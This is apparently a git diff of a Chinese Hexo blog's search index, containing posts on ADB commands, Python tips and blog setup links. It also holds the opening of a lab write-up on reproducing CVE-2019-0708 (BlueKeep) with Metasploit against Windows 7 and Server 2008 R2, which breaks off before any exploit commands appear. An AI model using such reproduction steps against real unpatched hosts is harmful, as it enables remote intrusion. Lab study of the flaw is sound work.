@@ -1,125 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Blog Reference Link</title>
-    <url>/2019/06/14/Blog-Reference-Link/</url>
-    <content><![CDATA[<blockquote><p>恩 有点特别的信<br>但是<br>但这是……<br>世界上最纯粹最美丽的思念</p>
-<footer><strong>文伽</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep102379" target="_blank" rel="noopener">Bilibili《死后文》</a></cite></footer></blockquote>
-
-<a id="more"></a>
-<hr>
-<!-- ![68527244_p0.jpg](68527244_p0.jpg) -->
-<img src="/2019/06/14/Blog-Reference-Link/68527244_p0.jpg" width="600" height="600" title="68527244_p0.jpg">
-
-<br>
-
-<p>配置 Blog时参考的链接：</p>
-<ul>
-<li><a href="https://blog.csdn.net/u011475210/article/details/79023429" target="_blank" rel="noopener">从jekyll到hexo</a></li>
-<li><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></li>
-<li><a href="https://www.jianshu.com/p/1f8107a8778c" target="_blank" rel="noopener">hexo搭建个人博客–NexT主题优化</a></li>
-<li><a href="https://blog.csdn.net/u011054333/article/details/82718910" target="_blank" rel="noopener">在Hexo博客上添加可爱的Live2D模型</a></li>
-<li><a href="https://www.jianshu.com/p/baea8c95e39b" target="_blank" rel="noopener">Hexo添加字数统计、阅读时长</a></li>
-<li><a href="https://segmentfault.com/q/1010000017254914" target="_blank" rel="noopener">下载的hexo主题必须删掉.git</a></li>
-<li><a href="https://www.cnblogs.com/php-linux/p/8416116.html" target="_blank" rel="noopener">2个小时教你hexo博客添加评论、打赏…</a></li>
-<li><a href="https://blog.csdn.net/qq_36759224/article/details/82121420#font_colorFF000__Hexo__Github_font_155" target="_blank" rel="noopener">使用GithubPages和Hexo搭建自己…</a></li>
-<li><a href="https://hubojing.github.io/2016/04/06/%E5%B0%86hexo-github%E5%8D%9A%E5%AE%A2%E5%90%8C%E6%AD%A5%E6%89%98%E7%AE%A1%E8%87%B3coding/" target="_blank" rel="noopener">将hexo+github博客同步托管至coding</a></li>
-<li><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT使用文档</a></li>
-<li><a href="https://www.jianshu.com/p/2e318226c88d" target="_blank" rel="noopener">使用Hexo+Next主题搭建自己的个人博客</a></li>
-</ul>
-<br>
-
-<ul>
-<li><a href="https://iochen.com/2018/01/06/use-gitalk-in-hexo/" target="_blank" rel="noopener">Hexo中Gitalk配置使用教程</a></li>
-<li><a href="https://asdfv1929.github.io/2018/01/20/gitalk/" target="_blank" rel="noopener">Hexo NexT主题中集成gitalk评论系统</a></li>
-<li><a href="https://tyloafer.github.io/posts/7790/" target="_blank" rel="noopener">Hexo中引入Mermaid流程图</a></li>
-<li><a href="https://github.com/webappdevelp/hexo-filter-mermaid-diagrams" target="_blank" rel="noopener">hexo-filter-mermaid-diagrams</a></li>
-</ul>
-<hr>
-<blockquote>
-<p>配置 gitalk评论系统注意</p>
-</blockquote>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gitalk.swig </span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> gitalk = <span class="keyword">new</span> Gitalk(&#123;</span><br><span class="line">      clientID: <span class="string">'&#123;&#123; theme.gitalk.ClientID &#125;&#125;'</span>,   <span class="comment">// &lt;----</span></span><br><span class="line">      clientSecret: <span class="string">'&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;'</span>, <span class="comment">// &lt;----</span></span><br><span class="line">      repo: <span class="string">'&#123;&#123; theme.gitalk.repo &#125;&#125;'</span>,</span><br><span class="line">      owner: <span class="string">'&#123;&#123; theme.gitalk.githubID &#125;&#125;'</span>,</span><br><span class="line">      admin: [<span class="string">'&#123;&#123; theme.gitalk.adminUser &#125;&#125;'</span>],</span><br><span class="line">      id: location.pathname,</span><br><span class="line">      distractionFreeMode: <span class="string">'&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    gitalk.render(<span class="string">'gitalk-container'</span>)           </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">githubID:</span> <span class="string">evilH2O2</span>  </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">gitalkComments</span>   </span><br><span class="line">  <span class="attr">ClientID:</span> <span class="string">xxxx</span>      <span class="comment"># &lt;---- 与上面对应，网上有版本不一样的 （ client_id )</span></span><br><span class="line">  <span class="attr">ClientSecret:</span> <span class="string">xxx</span>   <span class="comment"># &lt;---- 与上面对应</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">evilH2O2</span></span><br><span class="line">  <span class="attr">adminUser:</span> <span class="string">evilH2O2</span> </span><br><span class="line">  <span class="attr">distractionFreeMode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>用 代码块(3个 `) + mermaid使用 Mermaid流程图</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ``3 mermaid</span></span><br><span class="line"><span class="comment"># graph LR </span></span><br><span class="line"><span class="comment">#   A --&gt; B</span></span><br><span class="line"><span class="comment"># ``3</span></span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ADB常用命令</title>
-    <url>/2019/06/21/ADB%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<blockquote><p>摘下红花送伊人<br>红花似火绾青丝<br>红花啊红花，绾起伊人的青丝<br>伊人笑靥如花</p>
-<p>摘下白花送伊人<br>白花如雪别心口<br>白花啊白花，别在伊人的心口<br>伊人皎洁如月<br>伊人皎洁如月</p>
-<footer><strong>美绪</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep259703" target="_blank" rel="noopener">Bilibili《多罗罗》</a></cite></footer></blockquote>
-
-<a id="more"></a>
-
-<hr>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1353269777&auto=1&height=66"></iframe>
-
-<p><img src="73547799_p0.jpg" alt="73547799_p0.jpg"></p>
-<!--  -->
-
-<br>
-
-<h2 id="基本与应用"><a href="#基本与应用" class="headerlink" title="基本与应用"></a>基本与应用</h2><hr>
-<h3 id="查看设备"><a href="#查看设备" class="headerlink" title="查看设备"></a>查看设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb devices </span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># cf264b8f	device</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="进入shell"><a href="#进入shell" class="headerlink" title="进入shell"></a>进入shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line"><span class="comment"># OnePlus3T:/ $ ll</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="以-root-权限运行-手机需要-root"><a href="#以-root-权限运行-手机需要-root" class="headerlink" title="以 root 权限运行(手机需要 root)"></a>以 root 权限运行(手机需要 root)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line"><span class="comment"># restarting adbd as root</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># adbd cannot run as root in production builds</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="无线连接（需要借助-USB-线）"><a href="#无线连接（需要借助-USB-线）" class="headerlink" title="无线连接（需要借助 USB 线）"></a>无线连接（需要借助 USB 线）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到 IP地址(ifconfig/ip addr/ip link)</span></span><br><span class="line">OnePlus3T:/ $ ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让设备在 任意 端口监听 TCP/IP 连接</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb tcpip 8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 断开连接</span></span><br><span class="line"><span class="comment"># 通过 IP 地址连接设备</span></span><br><span class="line">adb connect &lt;device-ip-address[:port]&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb connect 192.168.1.3:8848</span></span><br><span class="line"><span class="comment"># connected to 192.168.1.3:8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看设备是否出现</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb devices</span></span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># 192.168.1.3:8848	unauthorized</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="断开无线连接"><a href="#断开无线连接" class="headerlink" title="断开无线连接"></a>断开无线连接</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb disconnect &lt;device-ip-address&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb disconnect 192.168.1.3:8848</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看应用列表"><a href="#查看应用列表" class="headerlink" title="查看应用列表"></a>查看应用列表</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm list packages [-f] [-d] [-e] [-s] [-3] [-i] [-u] [--user USER_ID] [FILTER]</span></span><br><span class="line"><span class="comment"># -s 	只显示系统应用</span></span><br><span class="line"><span class="comment"># -3 	只显示第三方应用</span></span><br><span class="line"><span class="comment"># &lt;FILTER&gt; 	包名包含 &lt;FILTER&gt; 字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -3</span></span><br><span class="line"><span class="comment"># package:com.github.shadowsocks</span></span><br><span class="line"><span class="comment"># package:com.chenupt.day</span></span><br><span class="line"><span class="comment"># package:org.telegram.messenger</span></span><br><span class="line"><span class="comment"># package:com.niksoftware.snapseed</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -s</span></span><br><span class="line"><span class="comment"># package:com.oneplus.calculator</span></span><br><span class="line"><span class="comment"># package:net.oneplus.weather</span></span><br><span class="line"><span class="comment"># package:com.android.cts.priv.ctsshim</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages bili</span></span><br><span class="line"><span class="comment"># package:com.hypergryph.arknights.bilibili</span></span><br><span class="line"><span class="comment"># package:com.bilibili.comic</span></span><br><span class="line"><span class="comment"># package:com.digitalsky.girlsfrontline.cn.bili</span></span><br><span class="line"><span class="comment"># package:tv.danmaku.bili</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="安装-卸载-APK"><a href="#安装-卸载-APK" class="headerlink" title="安装/卸载 APK"></a>安装/卸载 APK</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb install [-lrtsdg] &lt;path_to_apk&gt;</span></span><br><span class="line"><span class="comment"># -l 	将应用安装到保护目录 /mnt/asec</span></span><br><span class="line"><span class="comment"># -r 	允许覆盖安装</span></span><br><span class="line"><span class="comment"># -t 	允许安装 AndroidManifest.xml 里 application 指定 android:testOnly="true" 的应用</span></span><br><span class="line"><span class="comment"># -s 	将应用安装到 sdcard</span></span><br><span class="line"><span class="comment"># -d 	允许降级覆盖安装</span></span><br><span class="line"><span class="comment"># -g 	授予所有运行时权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细 : &lt;https://github.com/mzlogin/awesome-adb#%E5%AE%89%E8%A3%85-apk&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb uninstall [-k] &lt;packagename&gt;</span></span><br><span class="line"><span class="comment"># &lt;packagename&gt; 表示应用的包名，-k 参数可选，表示卸载应用但保留数据和缓存目录</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb uninstall com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="清除应用数据与缓存"><a href="#清除应用数据与缓存" class="headerlink" title="清除应用数据与缓存"></a>清除应用数据与缓存</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt;</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm clear com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看应用详细信息"><a href="#查看应用详细信息" class="headerlink" title="查看应用详细信息"></a>查看应用详细信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看应用安装路径"><a href="#查看应用安装路径" class="headerlink" title="查看应用安装路径"></a>查看应用安装路径</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm path &lt;PACKAGE&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm path com.bilibili.comic </span></span><br><span class="line"><span class="comment"># package:/data/app/com.bilibili.comic-VefU-I3Sq3yFa7hzXBuAXg==/base.apk</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="强制停止应用"><a href="#强制停止应用" class="headerlink" title="强制停止应用"></a>强制停止应用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell am force-stop &lt;packagename&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell am force-stop com.taobao.taoba</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><hr>
-<h3 id="复制设备里的文件到电脑"><a href="#复制设备里的文件到电脑" class="headerlink" title="复制设备里的文件到电脑"></a>复制设备里的文件到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb pull &lt;设备里的文件路径&gt; [电脑上的目录]</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb pull /sdcard/Pictures ~/Pictures</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="复制电脑里的文件到设备"><a href="#复制电脑里的文件到设备" class="headerlink" title="复制电脑里的文件到设备"></a>复制电脑里的文件到设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb push &lt;电脑上的文件路径&gt; &lt;设备里的目录&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb push ~/Documents/Python/hello.py /sdcard/Python</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="模拟按键-输入"><a href="#模拟按键-输入" class="headerlink" title="模拟按键/输入"></a>模拟按键/输入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># input [&lt;source&gt;] &lt;command&gt; [&lt;arg&gt;...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># adb shell input keyevent &lt;keycode&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 亮屏</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell input keyevent 224</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细: &lt;https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="实用功能"><a href="#实用功能" class="headerlink" title="实用功能"></a>实用功能</h2><h3 id="截图保存到电脑"><a href="#截图保存到电脑" class="headerlink" title="截图保存到电脑"></a>截图保存到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb exec-out screencap -p &gt; sc.png</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="录制屏幕"><a href="#录制屏幕" class="headerlink" title="录制屏幕"></a>录制屏幕</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 录制屏幕以 mp4 格式保存到 /sdcard</span></span><br><span class="line">adb shell screenrecord /sdcard/filename.mp4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按 Ctrl-C 停止</span></span><br><span class="line"><span class="comment"># 默认录制时间和最长录制时间都是 180 秒</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --size WIDTHxHEIGHT 	视频的尺寸，比如 1280x720，默认是屏幕分辨率。</span></span><br><span class="line"><span class="comment"># --bit-rate RATE 	视频的比特率，默认是 4Mbps。</span></span><br><span class="line"><span class="comment"># --time-limit TIME 	录制时长，单位秒。</span></span><br><span class="line"><span class="comment"># --verbose 	输出更多信息。</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Top-amp-amp-ps"><a href="#Top-amp-amp-ps" class="headerlink" title="Top &amp;&amp; ps"></a>Top &amp;&amp; ps</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell top</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell ps</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看进程-UID"><a href="#查看进程-UID" class="headerlink" title="查看进程 UID"></a>查看进程 UID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt; | grep userId=</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic | grep userId=</span></span><br><span class="line">    <span class="comment"># userId=10203</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>基本的 linux命令（ls/cat/df/rm/…）</p>
-</blockquote>
-<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
-<li><a href="https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5" target="_blank" rel="noopener">ADB Usage Complete / ADB 用法大全</a> </li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Test Page</title>
     <url>/2019/06/12/Test-Page/</url>
     <content><![CDATA[<p>本页面用来进行测试</p>
@@ -208,260 +89,54 @@
       </tags>
   </entry>
   <entry>
-    <title>Python不常用用法</title>
-    <url>/2019/09/04/Python%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>Python 日常使用时的一些方法或技巧，怕忘记怕麻烦，记录一下</p>
+    <title>Blog Reference Link</title>
+    <url>/2019/06/14/Blog-Reference-Link/</url>
+    <content><![CDATA[<blockquote><p>恩 有点特别的信<br>但是<br>但这是……<br>世界上最纯粹最美丽的思念</p>
+<footer><strong>文伽</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep102379" target="_blank" rel="noopener">Bilibili《死后文》</a></cite></footer></blockquote>
+
 <a id="more"></a>
-
-<h2 id="通过值获取键"><a href="#通过值获取键" class="headerlink" title="通过值获取键"></a>通过值获取键</h2><br>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dct = &#123;<span class="string">'Name'</span>: <span class="string">'Alice'</span>, <span class="string">'Age'</span>: <span class="number">18</span>, <span class="string">'uid'</span>: <span class="number">1001</span>, <span class="string">'id'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_key1</span><span class="params">(dct, value)</span>:</span></span><br><span class="line"><span class="meta">... </span>  <span class="keyword">return</span> list(filter(<span class="keyword">lambda</span> k:dct[k] == value, dct))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_key1(dct, <span class="number">1001</span>)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'uid'</span>]</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某函数返回的结果（参数 md5dict）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561284.jpg'</span>: <span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561271.jpg'</span>: <span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561279.jpg'</span>: <span class="string">'e5af4c3275dafbef5932ab69c446374c'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量 cp的内容</span></span><br><span class="line">(<span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'e5af4c3275dafbef5932ab69c446374c'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysedDict</span><span class="params">(md5dict)</span>:</span></span><br><span class="line">    cp = Counter(md5dict.values())  <span class="comment"># 只取 MD5值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filterFun</span><span class="params">(dicts, value)</span>:</span></span><br><span class="line">        bad = list(filter(<span class="keyword">lambda</span> k:dicts[k] == value, dicts))</span><br><span class="line">        print(bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.items():</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"\033[0;31m&#123;0&#125;\033[0m"</span>.format(i))</span><br><span class="line">            filterFun(md5dict, i[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line"><span class="comment"># ---- 结果 ------</span></span><br><span class="line"><span class="comment"># ('6beb7af8d37e26eb88bb1b75c8e51474', 2)</span></span><br><span class="line"><span class="comment"># ['/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg', '/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg']</span></span><br></pre></td></tr></table></figure>
+<hr>
+<!-- ![68527244_p0.jpg](68527244_p0.jpg) -->
+<img src="/2019/06/14/Blog-Reference-Link/68527244_p0.jpg" width="600" height="600" title="68527244_p0.jpg">
 
 <br>
 
-<h2 id="快速启动-http服务器"><a href="#快速启动-http服务器" class="headerlink" title="快速启动 http服务器"></a>快速启动 http服务器</h2><br>
+<p>配置 Blog时参考的链接：</p>
+<ul>
+<li><a href="https://blog.csdn.net/u011475210/article/details/79023429" target="_blank" rel="noopener">从jekyll到hexo</a></li>
+<li><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></li>
+<li><a href="https://www.jianshu.com/p/1f8107a8778c" target="_blank" rel="noopener">hexo搭建个人博客–NexT主题优化</a></li>
+<li><a href="https://blog.csdn.net/u011054333/article/details/82718910" target="_blank" rel="noopener">在Hexo博客上添加可爱的Live2D模型</a></li>
+<li><a href="https://www.jianshu.com/p/baea8c95e39b" target="_blank" rel="noopener">Hexo添加字数统计、阅读时长</a></li>
+<li><a href="https://segmentfault.com/q/1010000017254914" target="_blank" rel="noopener">下载的hexo主题必须删掉.git</a></li>
+<li><a href="https://www.cnblogs.com/php-linux/p/8416116.html" target="_blank" rel="noopener">2个小时教你hexo博客添加评论、打赏…</a></li>
+<li><a href="https://blog.csdn.net/qq_36759224/article/details/82121420#font_colorFF000__Hexo__Github_font_155" target="_blank" rel="noopener">使用GithubPages和Hexo搭建自己…</a></li>
+<li><a href="https://hubojing.github.io/2016/04/06/%E5%B0%86hexo-github%E5%8D%9A%E5%AE%A2%E5%90%8C%E6%AD%A5%E6%89%98%E7%AE%A1%E8%87%B3coding/" target="_blank" rel="noopener">将hexo+github博客同步托管至coding</a></li>
+<li><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT使用文档</a></li>
+<li><a href="https://www.jianshu.com/p/2e318226c88d" target="_blank" rel="noopener">使用Hexo+Next主题搭建自己的个人博客</a></li>
+</ul>
+<br>
 
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
+<ul>
+<li><a href="https://iochen.com/2018/01/06/use-gitalk-in-hexo/" target="_blank" rel="noopener">Hexo中Gitalk配置使用教程</a></li>
+<li><a href="https://asdfv1929.github.io/2018/01/20/gitalk/" target="_blank" rel="noopener">Hexo NexT主题中集成gitalk评论系统</a></li>
+<li><a href="https://tyloafer.github.io/posts/7790/" target="_blank" rel="noopener">Hexo中引入Mermaid流程图</a></li>
+<li><a href="https://github.com/webappdevelp/hexo-filter-mermaid-diagrams" target="_blank" rel="noopener">hexo-filter-mermaid-diagrams</a></li>
+</ul>
+<hr>
+<blockquote>
+<p>配置 gitalk评论系统注意</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gitalk.swig </span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> gitalk = <span class="keyword">new</span> Gitalk(&#123;</span><br><span class="line">      clientID: <span class="string">'&#123;&#123; theme.gitalk.ClientID &#125;&#125;'</span>,   <span class="comment">// &lt;----</span></span><br><span class="line">      clientSecret: <span class="string">'&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;'</span>, <span class="comment">// &lt;----</span></span><br><span class="line">      repo: <span class="string">'&#123;&#123; theme.gitalk.repo &#125;&#125;'</span>,</span><br><span class="line">      owner: <span class="string">'&#123;&#123; theme.gitalk.githubID &#125;&#125;'</span>,</span><br><span class="line">      admin: [<span class="string">'&#123;&#123; theme.gitalk.adminUser &#125;&#125;'</span>],</span><br><span class="line">      id: location.pathname,</span><br><span class="line">      distractionFreeMode: <span class="string">'&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    gitalk.render(<span class="string">'gitalk-container'</span>)           </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">githubID:</span> <span class="string">evilH2O2</span>  </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">gitalkComments</span>   </span><br><span class="line">  <span class="attr">ClientID:</span> <span class="string">xxxx</span>      <span class="comment"># &lt;---- 与上面对应，网上有版本不一样的 （ client_id )</span></span><br><span class="line">  <span class="attr">ClientSecret:</span> <span class="string">xxx</span>   <span class="comment"># &lt;---- 与上面对应</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">evilH2O2</span></span><br><span class="line">  <span class="attr">adminUser:</span> <span class="string">evilH2O2</span> </span><br><span class="line">  <span class="attr">distractionFreeMode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用 代码块(3个 `) + mermaid使用 Mermaid流程图</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ``3 mermaid</span></span><br><span class="line"><span class="comment"># graph LR </span></span><br><span class="line"><span class="comment">#   A --&gt; B</span></span><br><span class="line"><span class="comment"># ``3</span></span><br></pre></td></tr></table></figure>]]></content>
       <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2019-0708复现</title>
-    <url>/2019/09/12/CVE-2019-0708%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>CVE-2019-0708 远程桌面服务的远程代码执行漏洞, 漏洞触发无需用户交互</p>
-<a id="more"></a>
-
-<blockquote>
-<p>A remote code execution vulnerability exists in Remote Desktop Services formerly known as Terminal Services when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka ‘Remote Desktop Services Remote Code Execution Vulnerability’. —— <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708" target="_blank" rel="noopener">CVE</a></p>
-</blockquote>
-<br>
-
-<p>复现环境:</p>
-<ul>
-<li>Windows 7 (Build 7601, Service Pack 1) x64</li>
-<li>Windows server 2008 R2 x64</li>
-<li>Metaspliot (Ubuntu Server)</li>
-</ul>
-<blockquote>
-<p>初始版本的 Exp只适用于64位版本的 Windows 7和 Windows server 2008 R2</p>
-</blockquote>
-<br>
-
-<p>更新 MSF到最新（<strong>5.0.47</strong>）版本，推荐使用 Curl更新（需要删除旧版）：</p>
